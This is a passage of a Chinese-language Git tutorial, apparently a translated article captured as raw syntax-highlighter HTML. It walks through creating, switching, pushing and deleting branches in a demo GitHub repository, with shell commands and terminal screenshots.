-o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npwd\r\ngit branch\r\nls -la\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a684255098646-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe06a684255098646-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a684255098646-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe06a684255098646-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe06a684255098646-1\"><span class=\"crayon-e\">pwd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a684255098646-2\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">branch</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe06a684255098646-3\"><span class=\"crayon-v\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">la</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a684255098646-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><code>pwd</code> 命令（是当前工作目录的英文缩写）返回当前你所处的目录（以便确认你在 <code>Demo</code> 目录中），<code>git branch</code> 列出该项目在你主机上的全部分支，<code>ls -la</code> 列出当前目录下的所有文件。你的终端输出类似于：</p>\n<p><img class=\"aligncenter\" title=\"Terminal output\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/50e63bfafb866781b469c1a77a4f93a7.png\" alt=\"终端输出\"></p>\n<p>在 <code>master</code> 分支中，只有一个文件 <code>README.md</code>。（Git 会友好地忽略掉其它目录和文件。）</p>\n<p>接下来，运行如下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe06a68d103144449\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit status\r\ngit checkout -b myBranch\r\ngit status\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a68d103144449-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe06a68d103144449-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a68d103144449-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe06a68d103144449-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe06a68d103144449-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">status</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a68d103144449-2\"><span class=\"crayon-e\">git </span><span class=\"crayon-v\">checkout</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">b</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">myBranch</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe06a68d103144449-3\"><span class=\"crayon-e\">git </span><span class=\"crayon-i\">status</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a68d103144449-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>第一条命令 <code>git status</code> 告知你当前位于 <code>branch master</code>，（就像在终端中看到的那样）它与 <code>origin/master</code> 处于同步状态，这意味着 master 分支的本地副本中的全部文件也出现在 GitHub 中。两份副本没有差异，所有的提交也是一致的。</p>\n<p>下一条命令 <code>git checkout -b myBranch</code> 中的 <code>-b</code> 告知 Git 创建一个名为 <code>myBranch</code> 的新分支，然后 <code>checkout</code> 命令将我们切换到新创建的分支。运行第三条命令 <code>git status</code> 确保你已经位于刚创建的分支下。</p>\n<p>如你所见，<code>git status</code> 告知你当前处于 <code>myBranch</code> 分支，没有变更需要提交。这是因为我们既没有增加新文件，也没有修改已有文件。</p>\n<p><img class=\"aligncenter\" title=\"Terminal output\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/bf0f4c89a9667eb09fb29956b9cc9d56.png\" alt=\"终端输出\"></p>\n<p>如果希望以可视化的方式查看分支，可以运行 <code>gitk</code> 命令。如果遇到报错 <code>bash: gitk: command not found...</code>，请先安装 <code>gitk</code> 软件包（找到你操作系统对应的安装文档，以获得安装方式）。</p>\n<p>（LCTT 译注：需要在有 X 服务器的终端运行 <code>gitk</code>，否则会报错）</p>\n<p>下图展示了我们在 Demo 项目中的所作所为：你最后一次提交（的对应信息）是 <code>Delete file.txt</code>，在此之前有三次提交。当前的提交用黄点标注，之前的提交用蓝点标注，黄点和 <code>Delete file.txt</code> 之间的三个方块展示每个分支所在的位置（或者说每个分支中的最后一次提交的位置）。由于 <code>myBranch</code> 刚创建，提交状态与 <code>master</code> 分支及其对应的记为 <code>remotes/origin/master</code> 的远程 <code>master</code> 分支保持一致。（非常感谢来自 Red Hat 的 <a href=\"https://opensource.com/users/psav\">Peter Savage</a> 让我知道 <code>gitk</code> 这个工具）</p>\n<p><img class=\"aligncenter\" title=\"Gitk output\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/4d766fc6104150cd915e1348c4ca080c.png\" alt=\"Gitk 输出\"></p>\n<p>下面让我们在 <code>myBranch</code> 分支下创建一个新文件并观察终端输出。运行如下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe06a69a375439299\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\necho \"Creating a newFile on myBranch\" &gt; newFile\r\ncat newFile\r\ngit status\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a69a375439299-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe06a69a375439299-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a69a375439299-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe06a69a375439299-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe06a69a375439299-1\"><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Creating a newFile on myBranch\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">newFile</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a69a375439299-2\"><span class=\"crayon-e\">cat </span><span class=\"crayon-e\">newFile</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe06a69a375439299-3\"><span class=\"crayon-e\">git </span><span class=\"crayon-i\">status</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a69a375439299-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>第一条命令中的 <code>echo</code> 创建了名为 <code>newFile</code> 的文件，接着 <code>cat newFile</code> 打印出文件内容，最后 <code>git status</code> 告知你我们 <code>myBranch</code> 分支的当前状态。在下面的终端输出中，Git 告知 <code>myBranch</code> 分支下有一个名为 <code>newFile</code> 的文件当前处于 <code>untracked</code> 状态。这表明我们没有让 Git 追踪发生在文件 <code>newFile</code> 上的变更。</p>\n<p><img class=\"aligncenter\" title=\"Terminal output\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/9940ad61d955b4a2cfbeb264b8844f73.png\" alt=\"终端输出\"></p>\n<p>下一步是增加文件，提交变更并将 <code>newFile</code> 文件推送至 <code>myBranch</code> 分支（请回顾本系列上一篇文章获得更多细节）。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe06a6a0028808541\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit add newFile\r\ngit commit -m \"Adding newFile to myBranch\"\r\ngit push origin myBranch\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a6a0028808541-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe06a6a0028808541-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a6a0028808541-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe06a6a0028808541-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe06a6a0028808541-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">add </span><span class=\"crayon-e\">newFile</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a6a0028808541-2\"><span class=\"crayon-e\">git </span><span class=\"crayon-v\">commit</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Adding newFile to myBranch\"</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe06a6a0028808541-3\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">push </span><span class=\"crayon-e\">origin </span><span class=\"crayon-i\">myBranch</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a6a0028808541-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>在上述命令中，<code>push</code> 命令使用的分支参数为 <code>myBranch</code> 而不是 <code>master</code>。Git 添加 <code>newFile</code> 并将变更推送到你 GitHub 账号下的 Demo 仓库中，告知你在 GitHub 上创建了一个与你本地副本分支 <code>myBranch</code> 一样的新分支。终端输出截图给出了运行命令的细节及命令输出。</p>\n<p><img class=\"aligncenter\" title=\"Terminal output\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/4f3bcd2a38a341027ce084f1ed51bfa4.png\" alt=\"终端输出\"></p>\n<p>当你访问 GitHub 时，在分支选择的下拉列表中可以发现两个可供选择的分支。</p>\n<p><img class=\"aligncenter\" title=\"GitHub\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/29592bacfeab5a8a161ca2f1b837c350.png\" alt=\"GitHub\"></p>\n<p>点击 <code>myBranch</code> 切换到 <code>myBranch</code> 分支，你可以看到在此分支上新增的文件。</p>\n<p><img class=\"aligncenter\" title=\"GitHub\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/eb928ec5ffe78a74df84b376c33b30a8.png\" alt=\"GitHub\"></p>\n<p>截至目前，我们有两个分支：一个是 <code>master</code> 分支，只有一个 <code>README.md</code> 文件；另一个是 <code>myBranch</code> 分支，有两个文件。</p>\n<p>你已经知道如何创建分支了，下面我们再创建一个分支。输入如下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe06a6a4323032370\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit checkout master\r\ngit checkout -b myBranch2\r\ntouch newFile2\r\ngit add newFile2\r\ngit commit -m \"Adding newFile2 to myBranch2\"\r\ngit push origin myBranch2\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a6a4323032370-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe06a6a4323032370-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a6a4323032370-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe06a6a4323032370-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a6a4323032370-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe06a6a4323032370-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a6a4323032370-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe06a6a4323032370-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">checkout </span><span class=\"crayon-e\">master</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a6a4323032370-2\"><span class=\"crayon-e\">git </span><span class=\"crayon-v\">checkout</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">b</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">myBranch2</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe06a6a4323032370-3\"><span class=\"crayon-e\">touch </span><span class=\"crayon-e\">newFile2</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a6a4323032370-4\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">add </span><span class=\"crayon-e\">newFile2</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe06a6a4323032370-5\"><span class=\"crayon-e\">git </span><span class=\"crayon-v\">commit</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Adding newFile2 to myBranch2\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a6a4323032370-6\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">push </span><span class=\"crayon-e\">origin </span><span class=\"crayon-i\">myBranch2</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe06a6a4323032370-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>我不再给出终端输出，需要你自己尝试，但你可以在 <a href=\"https://github.com/kedark3/Demo/tree/myBranch2\">GitHub 代码库</a> 中验证你的结果。</p>\n<h3 id=\"toc_3\">删除分支</h3>\n<p>由于我们增加了两个分支，下面删除其中的一个（<code>myBranch</code>），包括两步：</p>\n<ol>\n<li><strong>删除本地分支</strong> 你不能删除正在操作的分支，故切换到 <code>master</code> 分支 （或其它你希望保留的分支），命令及终端输出如下：<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/e1b4762c1603c531f92cc662147e319d.png\" alt=\"\"><code>git branch</code> 可以列出可用的分支，使用 <code>checkout</code> 切换到 <code>master</code> 分支，然后使用 <code>git branch -D myBranch</code> 删除该分支。再次运行 <code>git branch</code> 检查是否只剩下两个分支（而不是三个）。</li>\n<li><strong>删除 GitHub 上的分支</strong> 使用如下命令删除 <code>myBranch</code> 的远程分支：<br>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe06a6ab448527767\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit push origin :myBranch\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a6ab448527767-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe06a6ab448527767-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe06a6ab448527767-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">push </span><span class=\"crayon-v\">origin</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-i\">myBranch</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a6ab448527767-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<br>\n<img class=\"aligncenter\" title=\"Terminal output\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/1b91a34117a4ea69a12a6c9f714f9def.png\" alt=\"Terminal output\"></li>\n</ol>\n<p>上面 <code>push</code> 命令中分支名称前面的冒号（<code>:</code>）告知 GitHub 删除分支。另一种写法为：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe06a6ae357615029\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit push -d origin myBranch\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a6ae357615029-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe06a6ae357615029-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe06a6ae357615029-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-v\">push</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">origin 